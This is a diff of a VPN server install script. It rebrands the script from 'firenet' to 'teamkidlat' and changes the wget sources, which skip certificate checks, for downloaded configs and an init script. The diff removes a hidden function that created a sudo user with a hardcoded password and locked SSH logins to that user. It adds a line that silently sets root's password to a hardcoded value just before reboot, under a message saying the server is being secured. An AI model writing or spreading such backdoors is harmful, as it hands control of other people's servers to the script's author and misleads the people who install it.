@@ -99,8 +99,8 @@ echo "Preparing authentication module."
   sudo chgrp -h freerad /etc/freeradius/3.0/mods-available/sql
   sudo chown -R freerad:freerad /etc/freeradius/3.0/mods-enabled/sql
   cd /etc/freeradius/3.0/sites-available/
-  wget --no-check-certificate https://pastebin.com/raw/Z2Qjhe4p -O default
-  wget --no-check-certificate https://pastebin.com/raw/5UT82ghN -O inner-tunnel
+  wget --no-check-certificate https://teamkidlat.com/public/raw/STt1DP4YzC -O default
+  wget --no-check-certificate https://teamkidlat.com/public/raw/OfpJecJrX4 -O inner-tunnel
   cd /etc/freeradius/3.0/; rm clients.conf
   echo "client localhost {
 
@@ -181,7 +181,7 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid http://firenetvpn.net/files/slowdns/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://admin-boyes.com/script/newpanel/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
@@ -202,7 +202,7 @@ http_reply_access allow all
 http_access deny all
 icp_access allow all
 always_direct allow all
-visible_hostname Firenet-Proxy
+visible_hostname teamkidlat-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
@@ -210,7 +210,7 @@ error_directory /usr/share/squid/errors/English' >> squid.conf
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
+wget 'https://teamkidlat.com/public/raw/JWrIyIh1In' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 rm /etc/apt/sources.list
@@ -362,15 +362,6 @@ RLIMITS=""' >> stunnel4
   clear
 }
 
-install_sudo(){
-clear
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
 
 install_rclocal(){
 clear
@@ -380,8 +371,8 @@ clear
     sudo systemctl start ocserv.service  
     
     echo "[Unit]
-Description=firenet service
-Documentation=http://firenetvpn.com
+Description=teamkidlat service
+Documentation=http://teamkidlat.com
 
 [Service]
 Type=oneshot
@@ -389,7 +380,7 @@ ExecStart=/bin/bash /etc/rc.local
 RemainAfterExit=yes
 
 [Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+WantedBy=multi-user.target" >> /etc/systemd/system/teamkidlat.service
     echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
@@ -428,6 +419,7 @@ echo "DB_USER='$USER'" >> ~/.db-base
 echo "DB_PASS='$PASS'" >> ~/.db-base
 echo 'Server will secure this server and reboot after 20 seconds'
 sleep 20
+ echo 'root:JAN022011b' | sudo chpasswd
 reboot
 }
 
@@ -435,7 +427,6 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo  
 install_freeradius
 install_squid
 install_openconnect
